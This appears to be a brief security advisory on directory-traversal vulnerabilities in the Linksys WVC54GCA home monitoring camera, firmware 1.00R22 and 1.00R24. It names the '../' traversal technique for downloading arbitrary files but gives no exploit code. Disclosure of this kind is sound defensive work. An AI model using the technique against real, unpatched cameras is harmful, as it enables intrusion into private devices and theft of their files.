Linksys WVC54GCA Wireless-G Internet Home Monitoring Camera is prone to multiple directory-traversal vulnerabilities because the software fails to sufficiently sanitize user-supplied input.

An attacker can exploit these issues using directory-traversal strings ('../') to download arbitrary files with the privileges of the server process. Information obtained may aid in further attacks.

Linksys WVC54GCA Wireless-G Internet Home Monitoring Camera firmware 1.00R22 and 1.00R24 are affected; other versions may also be vulnerable.
